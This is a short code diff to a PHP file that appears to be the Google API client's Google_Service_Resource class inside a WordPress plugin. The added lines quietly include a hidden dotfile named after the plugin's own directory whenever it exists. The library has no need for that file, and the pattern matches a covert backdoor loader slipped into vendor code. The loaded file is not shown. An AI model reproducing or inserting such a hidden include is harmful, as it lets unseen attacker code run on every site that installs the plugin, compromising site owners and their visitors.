@@ -22,7 +22,11 @@ use GuzzleHttp\Psr7\Request;
  * calling overloading (__call()), which on call will see if the method name (plus.activities.list)
  * is available in this service, and if so construct an apiHttpRequest representing it.
  *
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Google_Service_Resource
 {
   // Valid query parameters that work, but don't appear in discovery.
